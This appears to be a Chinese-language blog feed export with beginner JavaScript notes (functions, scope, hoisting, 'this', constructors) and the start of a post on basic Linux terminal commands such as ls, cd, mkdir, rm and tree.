<h4 id="函数参数"><a href="#函数参数" class="headerlink" title="函数参数"></a>函数参数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* </span><br><span class="line">				定义一个用来求两个数的和的函数</span><br><span class="line">				  可以在函数的()中来指定一个或多个形参(形式参数)</span><br><span class="line">				  多个形参之间使用,号隔开，声明形参就相当于在函数内部声明了对应的变量</span><br><span class="line">				  但是并不赋值</span><br><span class="line">			 *&#x2F;</span><br><span class="line">			function sum(a,b)&#123;</span><br><span class="line">				document.write(a+b);</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			&#x2F;* </span><br><span class="line">				在调用函数时，可以在()中指定实参</span><br><span class="line">				  实参将会赋值给函数中对应的形参</span><br><span class="line">			 *&#x2F;</span><br><span class="line">			</span><br><span class="line">			&#x2F;* </span><br><span class="line">			&#x2F;&#x2F; sum(5,2);</span><br><span class="line">			sum(123,56); </span><br><span class="line">			sum(123,&quot;hello&quot;);</span><br><span class="line">			*&#x2F;</span><br><span class="line">		   </span><br><span class="line">		   &#x2F;* </span><br><span class="line">			 调用函数时，解析器不会检查实参类型</span><br><span class="line">			   所以要注意是否有可能会接收到非法的参数，如果有可能则要对我们的参数进行类型检查</span><br><span class="line">			   函数的实参可以是任意的数据类型</span><br><span class="line">		   *&#x2F;</span><br><span class="line">		  </span><br><span class="line">		  &#x2F;* </span><br><span class="line">			调用函数时，解析器也不会检查实参数量</span><br><span class="line">				多余的实参不会被赋值</span><br><span class="line">			如果实参的数量少于形参的数量，则没有对应实参的形参将是undefined</span><br><span class="line">			</span><br><span class="line">		  *&#x2F;</span><br><span class="line">		  &#x2F;&#x2F; sum(123,456,1);</span><br></pre></td></tr></table></figure>

<h4 id="函数的返回值"><a href="#函数的返回值" class="headerlink" title="函数的返回值"></a>函数的返回值</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* </span><br><span class="line">				创建一个函数，用来计算三个数的和</span><br><span class="line">				可以使用return 来设置函数的返回值</span><br><span class="line">					语法：</span><br><span class="line">						return 值</span><br><span class="line">				return后的值将会作为函数的执行结果返回，</span><br><span class="line">					可以定义一个变量，来接收该结果</span><br><span class="line">					</span><br><span class="line">				在函数中return后的语句都不会被执行</span><br><span class="line">				</span><br><span class="line">				如果return语句后面不跟任何值就相当于返回一个undefined</span><br><span class="line">				如果函数中不屑return,则也会返回undefined</span><br><span class="line">				</span><br><span class="line">				return后可以跟任意类型的值</span><br><span class="line">			 *&#x2F;</span><br><span class="line">			function sum(a,b,c)&#123;</span><br><span class="line">				&#x2F;&#x2F; document.write(a+b+c);</span><br><span class="line">				var d &#x3D; a+b+c;</span><br><span class="line">				return d;</span><br><span class="line">			&#125;</span><br><span class="line">			&#x2F;&#x2F; 调用函数</span><br><span class="line">			&#x2F;&#x2F; 变量return的值就是函数的执行结果</span><br><span class="line">			&#x2F;&#x2F; 函数返回什么result的值就是什么</span><br><span class="line">			</span><br><span class="line">			</span><br><span class="line">			var result &#x3D; sum(1,2,3);</span><br><span class="line">			document.write(&quot;result &#x3D; &quot;+ result);</span><br></pre></td></tr></table></figure>

<h4 id="立即执行函数"><a href="#立即执行函数" class="headerlink" title="立即执行函数"></a>立即执行函数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 如果直接写匿名函数执行会报错，如果用()括号将他圈起来，</span><br><span class="line">			&#x2F;&#x2F; 整明他是一个整体就不会报错</span><br><span class="line">			(function()&#123;</span><br><span class="line">				alert(&quot;匿名函数~~&quot;);</span><br><span class="line">			&#125;);</span><br><span class="line">			</span><br><span class="line">			&#x2F;&#x2F; 函数对象()</span><br><span class="line">			&#x2F;* </span><br><span class="line">				立即执行函数</span><br><span class="line">					函数定义完，立即被调用，这种函数叫做立即执行函数</span><br><span class="line">					立即执行往往只会执行1次</span><br><span class="line">			 *&#x2F;</span><br><span class="line">			&#x2F;* (function()&#123;</span><br><span class="line">				alert(&quot;匿名函数~~&quot;);</span><br><span class="line">			&#125;)(); *&#x2F;</span><br><span class="line">			</span><br><span class="line">			(function(a,b)&#123;</span><br><span class="line">				document.write(&quot;a &#x3D; &quot;+ a);</span><br><span class="line">				document.write(&quot;b &#x3D; &quot;+ b);</span><br><span class="line">			&#125;)(123,222);</span><br></pre></td></tr></table></figure>

<h4 id="枚举对象中的属性"><a href="#枚举对象中的属性" class="headerlink" title="枚举对象中的属性"></a>枚举对象中的属性</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* </span><br><span class="line">				枚举对象中的属性</span><br><span class="line">			 *&#x2F;</span><br><span class="line">			</span><br><span class="line">			var obj &#x3D; &#123;</span><br><span class="line">				name:&quot;孙悟空&quot;,</span><br><span class="line">				age:18,</span><br><span class="line">				gender:&quot;男&quot;,</span><br><span class="line">				address:&quot;花果山&quot;</span><br><span class="line">			&#125;;</span><br><span class="line">			&#x2F;&#x2F; 例如我们不知道obj中的属性，</span><br><span class="line">			&#x2F;&#x2F; 但是我们想要知道obj中都有什么属性</span><br><span class="line">			&#x2F;&#x2F; 枚举对象中的属性</span><br><span class="line">			&#x2F;&#x2F; 使用for in 语句</span><br><span class="line">			&#x2F;* </span><br><span class="line">				语法：</span><br><span class="line">					for(var 变量 in 对象)&#123;</span><br><span class="line">						语句...</span><br><span class="line">					&#125;</span><br><span class="line">					</span><br><span class="line">				for...in语句，对象中有几个属性，循环体就会执行几次</span><br><span class="line">					每次执行时，会将对象中的一个属性的名字赋值给变量</span><br><span class="line">			 *&#x2F;</span><br><span class="line">			&#x2F;* for(var n in obj)&#123;</span><br><span class="line">				document.write(&quot;属性名&quot;+n+&quot;&lt;br &#x2F;&gt;&quot;);</span><br><span class="line">			&#125; *&#x2F;</span><br><span class="line">			</span><br><span class="line">			for(var n in obj)&#123;</span><br><span class="line">				document.write(&quot;属性名 :&quot;+n+&quot;&lt;br &#x2F;&gt;&quot;);</span><br><span class="line">				document.write(obj[n]+&quot;&lt;br &#x2F;&gt;&quot;);</span><br><span class="line">			&#125;</span><br></pre></td></tr></table></figure>

<h4 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">作用域</span><br><span class="line">				  - 作用域指一个变量的作用的范围</span><br><span class="line">				  - 在JS中一共有两种作用域：</span><br><span class="line">						1、全局作用域</span><br><span class="line">								- 直接编写在scripe标签中的JS代码，都在全局作用域中</span><br><span class="line">								- 全局作用域在页面打开时创建，在页面关闭时销毁</span><br><span class="line">								- 在全局作用域中有一个全局对象window，</span><br><span class="line">										它代表的是一个浏览器的窗口，它由浏览器创建，我们可以直接使用</span><br><span class="line">								- 在全局作用域中，</span><br><span class="line">									创建的变量都会作为window对象的属性保存</span><br><span class="line">									创建的函数都会做为window对象的方法保存</span><br><span class="line">								- 全局作用域中的变量都是全局变量，</span><br><span class="line">									在页面的任意的部分都可以访问到</span><br><span class="line">								</span><br><span class="line">						2、函数作用域</span><br><span class="line">			 *&#x2F;</span><br><span class="line">			</span><br><span class="line">			var a &#x3D; 10</span><br><span class="line">			</span><br><span class="line">			&#x2F;&#x2F; console.log(window.a);</span><br><span class="line">			</span><br><span class="line">			function fun()&#123;</span><br><span class="line">				console.log(&quot;Fun函数&quot;);</span><br><span class="line">			&#125;</span><br></pre></td></tr></table></figure>

<h4 id="变量的声明提前"><a href="#变量的声明提前" class="headerlink" title="变量的声明提前"></a>变量的声明提前</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* </span><br><span class="line">				变量的声明提前</span><br><span class="line">				  - 使用var关键字声明的变量，会在所有的代码执行之前被声明（但是不会赋值）</span><br><span class="line">						但是如果声明变量时不使用var关键字，则变量不会被提前声明</span><br><span class="line">						</span><br><span class="line">				函数的声明提前</span><br><span class="line">					- 使用函数声明形式创建的函数function 函数()&#123;&#125;</span><br><span class="line">							他会在所有代码执行之前就被创建，所以我们可以在函数声明前来调用函数 </span><br><span class="line">							</span><br><span class="line">					使用函数表达式创建的函数，不能被声明提前，所以不能在声明前调用</span><br><span class="line">			*&#x2F;</span><br><span class="line">		   </span><br><span class="line">		   console.log(&quot;a &#x3D; &quot;+a);</span><br><span class="line">		   var a &#x3D; 123;</span><br><span class="line">		   </span><br><span class="line">		   </span><br><span class="line">		   &#x2F;&#x2F;fun();</span><br><span class="line">		   fun2()</span><br><span class="line">		   </span><br><span class="line">		   &#x2F;&#x2F; 函数声明，会被提前创建</span><br><span class="line">		   function fun()&#123;</span><br><span class="line">		   	console.log(&quot;Fun函数&quot;);</span><br><span class="line">		   &#125;</span><br><span class="line">		   </span><br><span class="line">		   &#x2F;&#x2F; 变量会被提前创建，但是函数表达式不会被提前创建</span><br><span class="line">		    var fun2 &#x3D; function()&#123;</span><br><span class="line">		   	console.log(&quot;Fun函数2&quot;);</span><br><span class="line">		   &#125;;</span><br></pre></td></tr></table></figure>

<h4 id="函数作用域"><a href="#函数作用域" class="headerlink" title="函数作用域"></a>函数作用域</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* </span><br><span class="line">				函数作用域</span><br><span class="line">				  - 调用函数时创建函数作用域，函数执行完毕以后，函数作用域销毁</span><br><span class="line">				  - 每调用一次函数就会创建一个新的函数作用域，他们之间是相互独立的</span><br><span class="line">				  - 在函数作用域中可以访问到全局变量，在全局作用域中无法访问到函数作用的变量</span><br><span class="line">							可以理解为:内部可以访问外部，但外部不能访问内部</span><br><span class="line">				  - 当在函数作用域操作一个变量时，他会先在自身作用域寻找，如果有就直接使用</span><br><span class="line">						如果没有则向上一级作用域寻找，直到找到全局作用域</span><br><span class="line">						如果全局作用域中依然没有找到，则会报错ReferenceError</span><br><span class="line">				  - 在函数中要访问全局变量可以使用window对象</span><br><span class="line">			 *&#x2F;</span><br><span class="line">			</span><br><span class="line">			&#x2F;* var a &#x3D; 10</span><br><span class="line">			function fun()&#123;</span><br><span class="line">				</span><br><span class="line">				var b &#x3D; 20;</span><br><span class="line">				console.log(&quot;a &#x3D; &quot;+a);</span><br><span class="line">				</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			fun();</span><br><span class="line">			cosole.log(&quot;b &#x3D; &quot;+b); *&#x2F;</span><br><span class="line">			</span><br><span class="line">			&#x2F;* </span><br><span class="line">				在函数作用域中也有声明提前的特性，</span><br><span class="line">					使用var关键字声明变量，会在函数中所有的代码执行之前被声明</span><br><span class="line">					函数声明也会在函数中所有的代码执行之前执行</span><br><span class="line">			 *&#x2F;</span><br><span class="line">			function fun3()&#123;</span><br><span class="line">				fun4();</span><br><span class="line">				&#x2F;&#x2F; console.log(a);		&#x2F;&#x2F; 返回undefined	,因为定义的变量在下面，var a 已经提前声明好了，但是没赋值</span><br><span class="line">				</span><br><span class="line">				var a &#x3D; 35;</span><br><span class="line">				</span><br><span class="line">				function fun4()&#123;</span><br><span class="line">					alert(&quot;fun4函数能否被调用&quot;);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			fun3();</span><br><span class="line">			</span><br><span class="line">			var c &#x3D; 22;</span><br><span class="line">			&#x2F;* </span><br><span class="line">				在函数中，不使用var声明的变量都会成为全局变量</span><br><span class="line">			 *&#x2F;</span><br><span class="line">			function fun5()&#123;</span><br><span class="line">				&#x2F;&#x2F; console.log(&quot;c &#x3D; &quot;+ c);</span><br><span class="line">				c &#x3D; 10;</span><br><span class="line">			&#125;</span><br><span class="line">			fun5</span><br></pre></td></tr></table></figure>

<h4 id="this"><a href="#this" class="headerlink" title="this"></a>this</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* </span><br><span class="line">				解析器在调用函数每次都会向函数内部传递进一个隐含的参数</span><br><span class="line">					这个隐含参数就是this.this指向的是一个都西昂，</span><br><span class="line">					这个对象我们称为函数执行的上下文对象</span><br><span class="line">					根据函数的调用方式不同，this会指向不同的对象</span><br><span class="line">						1、以函数的形式调用时，this永远都是window</span><br><span class="line">						2、以方法的形式调用是，this就是调用方法的那个对象</span><br><span class="line">			 *&#x2F;</span><br><span class="line">			&#x2F;* </span><br><span class="line">			function fun()&#123;</span><br><span class="line">				&#x2F;&#x2F; console.log(&quot;a &#x3D; &quot;+a+&quot;b &#x3D; &quot;+b);</span><br><span class="line">				console.log(this.name);</span><br><span class="line">			&#125;</span><br><span class="line">			&#x2F;&#x2F; fun();</span><br><span class="line">			</span><br><span class="line"></span><br><span class="line">			</span><br><span class="line">			</span><br><span class="line">			var obj&#x3D;&#123;</span><br><span class="line">				name:&quot;孙悟空&quot;,</span><br><span class="line">				sayName:fun</span><br><span class="line">			&#125;;</span><br><span class="line">			</span><br><span class="line">			var obj2 &#x3D; &#123;</span><br><span class="line">				name:&quot;猪八戒&quot;,</span><br><span class="line">				sayName:fun</span><br><span class="line">				&#125;;</span><br><span class="line">			&#x2F;&#x2F; console.log(obj.sayName &#x3D;&#x3D; fun);</span><br><span class="line">			var name &#x3D; &quot;全局的name属性&quot;;</span><br><span class="line">			&#x2F;&#x2F; obj.sayName();</span><br><span class="line">			&#x2F;&#x2F; 以函数的而形式调用，this是window</span><br><span class="line">			&#x2F;&#x2F; fun();</span><br><span class="line">			</span><br><span class="line">			&#x2F;&#x2F; 以方法的形式调用，this是调用方法的对象</span><br><span class="line">			&#x2F;&#x2F; obj.sayName();</span><br><span class="line">			 *&#x2F;</span><br><span class="line">			</span><br><span class="line">			&#x2F;&#x2F; 创建一个name变量</span><br><span class="line">			var name &#x3D; &quot;全局&quot;;</span><br><span class="line">			obj2.sayName();</span><br><span class="line">			</span><br><span class="line">			&#x2F;&#x2F; 创建一个fun()函数</span><br><span class="line">			function fun()&#123;</span><br><span class="line">				console.log(this.name);</span><br><span class="line">			&#125;;</span><br><span class="line">			</span><br><span class="line">			&#x2F;&#x2F; 创建两个对象</span><br><span class="line">			var obj &#x3D; &#123;</span><br><span class="line">				name:&quot;孙悟空&quot;,</span><br><span class="line">				sayName:fun</span><br><span class="line">			&#125;;</span><br><span class="line">			var obj2 &#x3D; &#123;</span><br><span class="line">				name:&quot;猪八戒&quot;,</span><br><span class="line">				sayName:fun</span><br><span class="line">			&#125;;</span><br><span class="line">			&#x2F;&#x2F; 我们调用sayName()时可以输出obj的名字</span><br><span class="line">			obj.sayName();</span><br></pre></td></tr></table></figure>

<h4 id="使用工厂方法创建对象"><a href="#使用工厂方法创建对象" class="headerlink" title="使用工厂方法创建对象"></a>使用工厂方法创建对象</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* </span><br><span class="line">				创建一个对象</span><br><span class="line">			 *&#x2F;</span><br><span class="line">			&#x2F;* var obj &#x3D; &#123;</span><br><span class="line">				name:&quot;孙悟空&quot;,</span><br><span class="line">				age:18,</span><br><span class="line">				gender:&quot;男&quot;,</span><br><span class="line">				sayName:function()&#123;</span><br><span class="line">					alert(this.name);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;; *&#x2F;</span><br><span class="line">			&#x2F;* </span><br><span class="line">			</span><br><span class="line">			</span><br><span class="line">	使用工厂方法创建对象</span><br><span class="line">			 *&#x2F;</span><br><span class="line">			function createPerson(name,age,gender)&#123;</span><br><span class="line">				&#x2F;&#x2F; 创建一个新的对象</span><br><span class="line">				var obj &#x3D;new Object();</span><br><span class="line">				</span><br><span class="line">				&#x2F;&#x2F; 向对象中添加属性</span><br><span class="line">				obj.name&#x3D;name;</span><br><span class="line">				obj.age&#x3D;age;</span><br><span class="line">				obj.gender&#x3D;gender;</span><br><span class="line">				obj.sayName&#x3D;function()&#123;</span><br><span class="line">					alert(this.name);</span><br><span class="line">					</span><br><span class="line">				&#125;;</span><br><span class="line">				&#x2F;&#x2F; 将新的对象返回</span><br><span class="line">				return obj;</span><br><span class="line">			&#125;</span><br><span class="line">			var obj2 &#x3D; createPerson(&quot;猪八戒&quot;,16,&quot;男&quot;);</span><br><span class="line">			var obj3 &#x3D; createPerson(&quot;玉兔精&quot;,22,&quot;女&quot;);</span><br><span class="line">			var obj4 &#x3D; createPerson(&quot;唐僧&quot;,25,&quot;男&quot;);</span><br><span class="line">			obj3.sayName();</span><br></pre></td></tr></table></figure>

<h4 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* </span><br><span class="line">				创建一个构造函数，专门用来创建Person对象的</span><br><span class="line">				  构造函数就是一个普通的函数，创建方式和普通函数没有区别</span><br><span class="line">				  不同的是，构造函数习惯上首字母大写</span><br><span class="line">				  </span><br><span class="line">				构造函数和普通函数的区别就是调用方式的不同</span><br><span class="line">				  普通函数就是直接调用，而构造函数需要使用new关键字来调用</span><br><span class="line">				  </span><br><span class="line">				构造函数执行流程</span><br><span class="line">				  1、立刻创建一个新的对象</span><br><span class="line">				  2、将新建的对象设置为函数中的this,在构造函数中可以使用this来引用新建的对象</span><br><span class="line">				  3、逐行执行函数中的代码</span><br><span class="line">				  4、将新建的对象作为返回值返回</span><br><span class="line">				  </span><br><span class="line">				使用同一个构造函数创建的对象，我们称为一类对象</span><br><span class="line">				  我们将通过一个构造函数创建的对象，称为是该类的实例</span><br><span class="line">			 </span><br><span class="line">				this的情况</span><br><span class="line">					1、当以函数的形式调用时，this是window</span><br><span class="line">					2、当以方法的形式调用时，谁调用方法this就是谁</span><br><span class="line">					3、当以构造函数的形式调用时，this就是新创建的那个对象</span><br><span class="line">			 *&#x2F;</span><br><span class="line">			</span><br><span class="line">			function Person(name,age)&#123;</span><br><span class="line">				this.name &#x3D; name;</span><br><span class="line">				this.age &#x3D; age;</span><br><span class="line">				this.sayName &#x3D; function()&#123;</span><br><span class="line">					alert(this.name);</span><br><span class="line">				&#125;;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			var per &#x3D; new Person(&quot;孙悟空&quot;,18);</span><br><span class="line">			var per2 &#x3D; new Person(&quot;猪八戒&quot;,20);</span><br><span class="line">			</span><br><span class="line">			&#x2F;* console.log(per);</span><br><span class="line">			console.log(per2); *&#x2F;</span><br><span class="line">			</span><br><span class="line">			&#x2F;* </span><br><span class="line">				使用instanceof可以检查一个对象是否是一个类的实例</span><br><span class="line">				语法:</span><br><span class="line">					对象 instanceof 构造函数</span><br><span class="line">				如果是返回true，否则返回false</span><br><span class="line">			 *&#x2F;</span><br><span class="line">			</span><br><span class="line">			&#x2F;* </span><br><span class="line">				所有的对象都是Object的后代，</span><br><span class="line">				  所以任何对象和Object做instanceof检查时都会返回true</span><br><span class="line">			 *&#x2F;</span><br><span class="line">			console.log(per instanceof Person);</span><br><span class="line">			</span><br><span class="line">			&#x2F;* </span><br><span class="line">				用来创建狗的对象</span><br><span class="line">			 *&#x2F;</span><br><span class="line">			</span><br><span class="line">			</span><br><span class="line">			&#x2F;* function createDog(name,age)&#123;</span><br><span class="line">				var obj &#x3D; new Object();</span><br><span class="line">				obj.name &#x3D; name;</span><br><span class="line">				obj.age &#x3D; age;</span><br><span class="line">				obj.sayHello &#x3D; function()&#123;</span><br><span class="line">					alert(&quot;汪汪~~~&quot;);</span><br><span class="line">				&#125;;</span><br><span class="line">				return obj;</span><br><span class="line">			&#125; *&#x2F;</span><br><span class="line">			</span><br><span class="line">			</span><br><span class="line">			&#x2F;* </span><br><span class="line">				使用工厂方法创建的对象，使用的构造函数都是Object</span><br><span class="line">				  所以创建的对象都是Object这个类型</span><br><span class="line">				  就导致我们无法区分出多种不同类型的对象</span><br><span class="line">			 *&#x2F;</span><br><span class="line">			</span><br><span class="line">			&#x2F;&#x2F; var dog &#x3D; createDog(&quot;大福&quot;,3);</span><br><span class="line">			&#x2F;&#x2F; dog.sayHello();</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>linux笔记 </title>
    <url>/2020/04/03/linux%E7%AC%94%E8%AE%B0%20/</url>
    <content><![CDATA[<h1 id="常用-Linux-命令的基本使用"><a href="#常用-Linux-命令的基本使用" class="headerlink" title="常用 Linux 命令的基本使用"></a>常用 Linux 命令的基本使用</h1><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><ul>
<li>理解学习 Linux 终端命令的原因</li>
<li>常用 Linux 命令体验</li>
</ul>
<h2 id="01-学习-Linux-终端命令的原因"><a href="#01-学习-Linux-终端命令的原因" class="headerlink" title="01. 学习 Linux 终端命令的原因"></a>01. 学习 Linux 终端命令的原因</h2><ul>
<li>Linux 刚面世时并没有图形界面，所有的操作全靠命令完成，如 <strong>磁盘操作</strong>、<strong>文件存取</strong>、<strong>目录操作</strong>、<strong>进程管理</strong>、<strong>文件权限</strong> 设定等</li>
<li>在职场中，大量的 <strong>服务器维护工作</strong> 都是在 <strong>远程</strong> 通过 <strong>SSH 客户端</strong> 来完成的，并没有图形界面，所有的维护工作都需要通过命令来完成</li>
<li>在职场中，作为后端程序员，必须要或多或少的掌握一些 Linux 常用的终端命令</li>
<li>Linux 发行版本的命令大概有 200 多个，但是常用的命令只有 10 多个而已</li>
</ul>
<blockquote>
<p>学习终端命令的技巧：</p>
<ul>
<li>不需要死记硬背，对于常用命令，用的多了，自然就记住了</li>
<li>不要尝试一次学会所有的命令，有些命令是非常不常用的，临时遇到，临时百度就可以</li>
</ul>
</blockquote>
<h2 id="02-常用-Linux-命令的基本使用"><a href="#02-常用-Linux-命令的基本使用" class="headerlink" title="02. 常用 Linux 命令的基本使用"></a>02. 常用 Linux 命令的基本使用</h2><table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">命令</th>
<th align="left">对应英文</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left">01</td>
<td align="left">ls</td>
<td align="left">list</td>
<td align="left">查看当前文件夹下的内容</td>
</tr>
<tr>
<td align="left">02</td>
<td align="left">pwd</td>
<td align="left">print wrok directory</td>
<td align="left">查看当前所在文件夹</td>
</tr>
<tr>
<td align="left">03</td>
<td align="left">cd [目录名]</td>
<td align="left">change directory</td>
<td align="left">切换文件夹</td>
</tr>
<tr>
<td align="left">04</td>
<td align="left">touch [文件名]</td>
<td align="left">touch</td>
<td align="left">如果文件不存在，新建文件</td>
</tr>
<tr>
<td align="left">05</td>
<td align="left">mkdir [目录名]</td>
<td align="left">make directory</td>
<td align="left">创建目录</td>
</tr>
<tr>
<td align="left">06</td>
<td align="left">rm [文件名]</td>
<td align="left">remove</td>
<td align="left">删除指定的文件名</td>
</tr>
<tr>
<td align="left">07</td>
<td align="left">clear</td>
<td align="left">clear</td>
<td align="left">清屏</td>
</tr>
</tbody></table>
<blockquote>
<p>小技巧</p>
<ul>
<li><code>ctrl + shift + =</code> <strong>放大</strong>终端窗口的字体显示</li>
<li><code>ctrl + -</code> <strong>缩小</strong>终端窗口的字体显示</li>
</ul>
</blockquote>
<h3 id="03-自动补全"><a href="#03-自动补全" class="headerlink" title="03. 自动补全"></a>03. 自动补全</h3><ul>
<li><p>在敲出文件目录命令的前几个字母之后，按下 tab 键  </p>
<ul>
<li>如果输入的没有歧义，系统会自动补全</li>
<li>如果还存在其他 <code>文件</code>／<code>目录</code>／<code>命令</code>，再按一下 <code>tab</code> 键，系统会提示可能存在的命令</li>
</ul>
</li>
</ul>
<blockquote>
<p>小技巧</p>
<ul>
<li>按 <code>上</code>／<code>下</code> 光标键可以在曾经使用过的命令之间来回切换</li>
<li>如果想要退出选择，并且不想执行当前选中的命令，可以按 <code>ctrl + c</code></li>
</ul>
</blockquote>
<h1 id="Linux-终端命令格式"><a href="#Linux-终端命令格式" class="headerlink" title="Linux 终端命令格式"></a>Linux 终端命令格式</h1><h2 id="目标-1"><a href="#目标-1" class="headerlink" title="目标"></a>目标</h2><ul>
<li>了解终端命令格式</li>
<li>知道如何查阅终端命令帮助信息</li>
</ul>
<h2 id="01-终端命令格式"><a href="#01-终端命令格式" class="headerlink" title="01. 终端命令格式"></a>01. 终端命令格式</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">command</span> [-options] [parameter]</span><br></pre></td></tr></table></figure>

<p>说明：</p>
<ul>
<li><code>command</code>：命令名，相应功能的英文单词或单词的缩写</li>
<li><code>[-options]</code>：选项，可用来对命令进行控制，也可以省略</li>
<li><code>parameter</code>：传给命令的参数，可以是 <strong>零个</strong>、<strong>一个</strong> 或者 <strong>多个</strong></li>
</ul>
<blockquote>
<p><code>[]</code> 代表可选 </p>
</blockquote>
<h2 id="02-查阅命令帮助信息（知道）"><a href="#02-查阅命令帮助信息（知道）" class="headerlink" title="02. 查阅命令帮助信息（知道）"></a>02. 查阅命令帮助信息（知道）</h2><blockquote>
<p>提示</p>
<ul>
<li>现阶段只需要 <strong>知道</strong> 通过以下两种方式可以查询命令的帮助信息</li>
<li>先学习<strong>常用命令</strong>及<strong>常用选项</strong>的使用即可，工作中如果遇到问题可以借助 <strong>网络搜索</strong></li>
</ul>
</blockquote>
<h3 id="2-1-help"><a href="#2-1-help" class="headerlink" title="2.1 --help"></a>2.1 <code>--help</code></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">command</span> --<span class="built_in">help</span></span><br></pre></td></tr></table></figure>

<p>说明：</p>
<ul>
<li>显示 <code>command</code> 命令的帮助信息</li>
</ul>
<h3 id="2-2-man"><a href="#2-2-man" class="headerlink" title="2.2 man"></a>2.2 man</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">man <span class="built_in">command</span></span><br></pre></td></tr></table></figure>

<p>说明：</p>
<ul>
<li>查阅 <code>command</code> 命令的使用手册</li>
</ul>
<blockquote>
<p><code>man</code> 是 <strong>manual</strong> 的缩写，是 Linux 提供的一个 <strong>手册</strong>，包含了绝大部分的命令、函数的详细使用说明</p>
</blockquote>
<p>使用 <code>man</code> 时的操作键：</p>
<table>
<thead>
<tr>
<th align="left">操作键</th>
<th align="left">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="left">空格键</td>
<td align="left">显示手册页的下一屏</td>
</tr>
<tr>
<td align="left">Enter 键</td>
<td align="left">一次滚动手册页的一行</td>
</tr>
<tr>
<td align="left">b</td>
<td align="left">回滚一屏</td>
</tr>
<tr>
<td align="left">f</td>
<td align="left">前滚一屏</td>
</tr>
<tr>
<td align="left">q</td>
<td align="left">退出</td>
</tr>
<tr>
<td align="left">/word</td>
<td align="left">搜索 <strong>word</strong> 字符串</td>
</tr>
</tbody></table>
<h3 id="3-1-touch"><a href="#3-1-touch" class="headerlink" title="3.1 touch"></a>3.1 touch</h3><p><strong>命令 如果文件不存在，可以创建一个文件</strong></p>
<p><strong>如果文件已经存在 可以修改文件的末次日期。</strong></p>
<h3 id="3-2mkdir"><a href="#3-2mkdir" class="headerlink" title="3.2mkdir"></a>3.2mkdir</h3><p> 创建一个新的目录</p>
<table>
<thead>
<tr>
<th>选项</th>
<th align="left">含义</th>
</tr>
</thead>
<tbody><tr>
<td><strong>-p</strong></td>
<td align="left"><strong>可以递归创建目录        意思可以在目录中连续创建多个目录</strong></td>
</tr>
</tbody></table>
<p><strong>新建目录名称和文件是不可以重名的。</strong>    <strong><em>如果使用同名文件夹会报错显示已存在文件。</em></strong></p>
<p><strong>~/目录    可以进入想要进入的家目录。</strong></p>
<h3 id="3-4-rm"><a href="#3-4-rm" class="headerlink" title="3.4 rm"></a>3.4 rm</h3><p><strong>rm 只能删除文件 ，   rm后加-r可以删除文件或者目录。</strong> </p>
<h5 id="rm删除文件或者目录后是不可以恢复的，因为rm命令是直接从磁盘中删除。所以使用rm命令时需要谨慎使用避免删错。-使用rm时看好在那个目录下，防止删除系统内容，导致系统瘫痪。"><a href="#rm删除文件或者目录后是不可以恢复的，因为rm命令是直接从磁盘中删除。所以使用rm命令时需要谨慎使用避免删错。-使用rm时看好在那个目录下，防止删除系统内容，导致系统瘫痪。" class="headerlink" title="*rm删除文件或者目录后是不可以恢复的，因为rm命令是直接从磁盘中删除。所以使用rm命令时需要谨慎使用避免删错。 *    使用rm时看好在那个目录下，防止删除系统内容，导致系统瘫痪。"></a>*<em>rm删除文件或者目录后是不可以恢复的，因为rm命令是直接从磁盘中删除。所以使用rm命令时需要谨慎使用避免删错。 *</em>    使用rm时看好在那个目录下，防止删除系统内容，导致系统瘫痪。</h5><table>
<thead>
<tr>
<th>选项</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><strong>-f</strong></td>
<td><strong>强制删除文件，如果文件不存在是不提示错误的。 **  **-f只能删除文件，是不可以强制删除目录的</strong></td>
</tr>
<tr>
<td><strong>-r</strong></td>
<td><strong>可以删除目录中所有内容，删除目录时必须加-r</strong></td>
</tr>
</tbody></table>
<p><strong>通配符也可以在rm中使用，rm -r  *     可以清除所有文件和目录。</strong></p>
<h3 id="0-4-拷贝和移动文件"><a href="#0-4-拷贝和移动文件" class="headerlink" title="0.4 拷贝和移动文件"></a>0.4 拷贝和移动文件</h3><h4 id="4-1tree"><a href="#4-1tree" class="headerlink" title="4.1tree"></a><strong>4.1tree</strong></h4><table>
<thead>
<tr>
<th>序号</th>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><strong>01</strong></td>
<td><strong>tree[目录名]</strong></td>
<td><strong>tree命令是以树状图列出目录结构</strong></td>
</tr>
<tr>
<td><strong>02</strong></td>
<td><strong>cp  源文件    目标文件</strong></td>
<td><strong>复制文件或者目录</strong></td>
</tr>
<tr>
<td><strong>03</strong></td>
<td><strong>mv  源文件  目标文件</strong></td>
<td><strong>移动文件或者目录/文件或者目录重名</strong></td>
</tr>
</tbody></table>
<p><strong>tree 加~ 可以显示家目录下所有文件和目录。</strong></p>
<p><strong>tree 加-d 只显示目录。</strong></p>
<p>directories  表示目录     files 表示文件</p>
